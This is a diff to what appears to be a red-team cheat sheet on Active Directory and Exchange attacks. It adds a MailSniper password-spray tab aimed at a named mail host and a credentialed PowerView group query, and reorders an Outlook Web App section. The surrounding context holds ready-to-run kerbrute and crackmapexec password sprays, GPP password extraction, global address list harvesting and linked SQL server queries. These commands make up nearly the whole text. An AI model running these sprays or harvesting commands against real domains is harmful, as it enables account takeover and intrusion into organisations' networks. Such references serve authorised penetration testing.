@@ -63,7 +63,7 @@ $creds = New-Object System.Management.Automation.PSCredential ('username', $pass
 #### Domain Policy Enumeration
 
 Domain Password Policy
-https://www.windows-active-directory.com/active-directory-password-policies.html#:~:text=You%20can%20view%20the%20default%20password%20policy%20using%20one%20of%20two%20ways.&text=Go%20to%20Start%20Menu%20→,policies%20have%20to%20be%20set.
+https://www.windows-active-directory.com/active-directory-password-policies.html.
 
 
 <Tabs items={['ADModule', 'CME']}>
@@ -153,12 +153,18 @@ Get-NetLoggedOn -ComputerName computer_name
 
 # Get locally logged-on users on a computer (Note: must be local admins, and remote registery must  be runnong on the target [remote registry is started by default])
 Get-LoggedOnLocal -Computername computer_name 
+
+
 ```
 
 #### Domain Group Enumeration
 <Tabs items={['PowerView', 'ADModule']}>
   <Tab>
     ```powershell copy
+    # List groups a user is member of 
+    Get-NetGroup -MemberIdentity target_user -Credential $creds -DomainController ip -domain domain.com | select samaccountname
+
+    
     Get-NetGroup  
     Get-NetGroup -domain other_domain  
     Get-NetGroup -Fulldata
@@ -421,7 +427,7 @@ Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
 
 ### Password Spray
 
-<Tabs items={['Kerberos', 'SMB']}>
+<Tabs items={['Kerberos', 'SMB', 'Exchange & Microsoft 365']}>
   <Tab>
     ```bash  copy
     kerbrute  passwordspray -d domain.local --dc dc-ip users.txt 'P@ssw0rd'
@@ -430,6 +436,11 @@ Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
   <Tab>
     ```bash copy
     crackmapexec smb dc-ip users.txt 'P@ssw0rd' 
+    ```
+  </Tab>
+   <Tab>
+    ```bash copy
+    Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
     ```
   </Tab>
 </Tabs>
@@ -601,12 +612,16 @@ select * from openquery("sqlServer", 'select * from master..sysservers')
 select * from openquery("sqlServer1", ' select * from openquery("sqlServer2",' 'SELECT user' ' ) ')
 
 ```
-#### Microsoft Exchange and Outlook Web App
+#### Exchange & 365 & Outlook
+[Generate userlist](/Red_Teaming/lists#usernames)
+- https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/
 ```powershell copy filename="MailSniper"
+# Password Spray
+Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password 'P@ssw0rd' -Threads 15 -OutFile owa-sprayed-creds.txt
+
 # Get Global Address List
 Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Spring2021 -OutFile gal.txt
 
-# Password Spray
-Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password 'P@ssw0rd' -Threads 15 -OutFile owa-sprayed-creds.txt
+
 ```
 
